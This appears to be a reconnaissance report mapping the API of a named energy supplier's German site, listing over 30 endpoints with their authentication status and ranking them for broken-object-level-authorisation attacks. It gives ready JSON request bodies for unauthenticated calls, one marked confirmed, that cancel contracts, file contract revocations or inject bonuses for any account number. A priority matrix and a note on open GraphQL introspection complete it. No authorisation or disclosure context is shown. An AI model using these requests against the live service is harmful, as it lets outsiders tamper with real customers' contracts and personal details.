# Octopus Energy Germany (DE) — Full Endpoint Analysis

> **Source:** JS files + User-provided manual analysis
> **Date:** July 2026

---

## 1. Confirmed Endpoints (Complete List)

### Auth
| Endpoint | Method | Auth | BOLA |
|----------|--------|------|------|
| `/api/auth/login` | POST | ❌ | ⚪️ Auth need |
| `/api/auth/logout` | POST | ✅ | ⚪️ Auth need |
| `/api/auth/session` | GET | ✅ | ⚪️ Auth need |
| `/api/auth/update-org-token` | POST | ✅ | ⚪️ Auth need |

### Account
| Endpoint | Method | Auth | BOLA |
|----------|--------|------|------|
| `/api/create-account` | POST | ❌ | 🔴 Valnerable |
| `/api/update-user-details` | POST | ✅ | ⚪️ Auth cookie need |

### Signup
| Endpoint | Method | Auth | BOLA |
|----------|--------|------|------|
| `/api/signup/change-email` | POST | ❌ | ⚪️ Auth cookie need |
| `/api/signup/finalize` | POST | ❌ | ⚪️ Token need |
| `/api/signup/request-verification` | POST | ❌ | ⚪️ Register - not vuln |
| `/api/signup/resend` | POST | ❌ | ⚪️ Auth cookie need |

### Onboarding
| Endpoint | Method | Auth | BOLA |
|----------|--------|------|------|
| `/api/onboarding/submit-form` | POST | ❌ | ⚪️ Register - not vuln |
| `/api/onboarding/select-quoted-products` | POST | ❌ | ⚪️ Register - not vuln |
| `/api/onboarding/process-bonus-code` | POST | ❌ | ⚪️ Register - not vuln |
| `/api/onboarding/handoff/save` | POST | ✅ | ⚪️ Register -need session |

### Public
| Endpoint | Method | Auth | BOLA |
|----------|--------|------|------|
| `/api/public-cancellation` | POST | ❌ | ⚪️ loger |
| `/api/typeform/[formId]/[responseId]` | GET | ❌ | 🟡 |
| `/api/job-postings` | GET | ❌ | ⚪️ not important |
| `/api/newsletter-signup` | POST | ❌ | ⚪️ not important |
| `/api/fan-club-mailist-registration` | POST | ❌ | ⚪️ not important |

### Zapier Integrations
| Endpoint | Method | Auth | BOLA |
|----------|--------|------|------|
| `/api/zapier-contract-revocation` | POST | ❌ | ⚪️ 3party |
| `/api/zapier-dual-bonus` | POST | ❌ | ⚪️ 3party |

### Post-Registration
| Endpoint | Method | Auth | BOLA |
|----------|--------|------|------|
| `/api/post-registration-business` | POST | ❌ | ⚪️ TimeOut Removed |
| `/api/post-registration-tou` | POST | ❌ | ⚪️ not worked |

### Other
| Endpoint | Method | Auth | BOLA |
|----------|--------|------|------|
| `/api/self-serve-tariff-switch` | POST | ✅ | ⚪️ need auth |
| `/api/retention-offer/accept` | POST | ✅ | ⚪️ need auth |
| `/api/relocation-collect-errors` | POST | ✅ | ⚪️ not important |
| `/api/robots` | GET | ❌ | ⚪️ not important |
| `/api/vercel/flags` | GET | ❌ | ⚪️ not important |

### GraphQL
| Endpoint | Backend |
|----------|---------|
| `/api/graphql/kraken` | Kraken API (DE) |
| `/api/graphql/oe-backend` | OE Backend |

---

## 2. Detailed BOLA Candidates

### 🔴 `POST /api/public-cancellation`
**Status:** ✅ **Confirmed BOLA**
```json
{
  "firstName": "test",
  "lastName": "test",
  "email": "test@test.com",
  "accountNumber": "A-A630C123",
  "supplyType": {"value": "electricity"},
  "cancelType": {"value": "regular"},
  "cancelReason": "test",
  "cancelAsap": "asap"
}
```
- Auth: ❌ **None**
- Content-Type: `text/plain;charset=UTF-8`
- Response: `201 Created` with cancellation record
- **Risk:** Initiate cancellation for any account number

---

### 🔴 `POST /api/zapier-contract-revocation`
```json
{
  "givenName": "string",
  "familyName": "string",
  "accountNumber": "A-XXXXX",
  "email": "email@test.com",
  "contracts": ["electricity"],
  "timestamp": "2026-07-15T00:00:00.000Z"
}
```
- Auth: ❌ **None** — fires Zapier webhook
- **Risk:** Submit fake revocation for any account

---

### 🔴 `POST /api/zapier-dual-bonus`
```json
{
  "accountNumber": "A-XXXXX",
  "signupId": "...",
  "timestamp": "ISO-date",
  "tariffNameElectricity": "...",
  "tariffNameGas": "...",
  "fuelType": "...",
  "bonus": 100
}
```
- Auth: ❌ **None** — fire-and-forget to Zapier
- **Risk:** Inject false bonus data for any account

---

### 🔴 `POST /api/update-user-details`
- URL contains `[accountNumber]` → IDOR via path traversal
- Auth: ✅ Cookie
- **Risk:** Update personal details of other accounts

---

### 🔴 `POST /api/signup/finalize`
- Finalizes signup process
- Auth: ❌
- **Risk:** Could finalize signup for another user's session

---

### 🔴 `POST /api/onboarding/submit-form`
- Main onboarding form submission
- Auth: ❌
- **Risk:** Submit onboarding data for any account

---

### 🔴 `POST /api/retention-offer/accept`
- Accepts a retention offer (discount/credit to stay)
- Auth: ✅
- **Risk:** Accept offer on behalf of another account

---

### 🔴 `POST /api/self-serve-tariff-switch`
- Switch tariff without agent assistance
- Auth: ✅
- **Risk:** Switch tariff on another account

---

## 3. Priority Matrix

| Priority | Endpoint | Type | Reason |
|----------|----------|------|--------|
| 🔴 **CRITICAL** | `/api/zapier-contract-revocation` | No Auth | Cancel any account's contracts |
| 🔴 **CRITICAL** | `/api/zapier-dual-bonus` | No Auth | Inject false bonuses |
| 🔴 **HIGH** | `/api/public-cancellation` | No Auth | **Confirmed** — initiate cancellation |
| 🔴 **HIGH** | `/api/update-user-details` | IDOR | Change other users' details |
| 🔴 **HIGH** | `/api/signup/finalize` | No Auth | Finalize signup for others |
| 🔴 **HIGH** | `/api/self-serve-tariff-switch` | Auth | Switch tariff for others |
| 🔴 **HIGH** | `/api/retention-offer/accept` | Auth | Accept offers for others |
| 🟡 **MED** | `/api/create-account` | No Auth | Mass assignment (like .fr) |
| 🟡 **MED** | `/api/signup/change-email` | No Auth | Email change during signup |
| 🟡 **MED** | `/api/onboarding/process-bonus-code` | No Auth | Bonus code enumeration |
| 🟢 **LOW** | Other signup/newsletter/robots | — | Standard endpoints |

---

## 4. GraphQL (Kraken DE)

| Endpoint | Status |
|----------|--------|
| `api.oeg-kraken.energy/v1/graphql/` | ✅ Alive |
| Introspection without auth | ✅ Possible |

---

## 5. Error Codes

| Code | Description |
|------|-------------|
| KT-CT-1111 | Unauthorized |
| KT-CT-1112 | No Authorization header |
| KT-CT-1113 | Disabled field |
| KT-CT-1130 | Refresh token missing |

---

*Generated from JS files — 30+ API endpoints found*
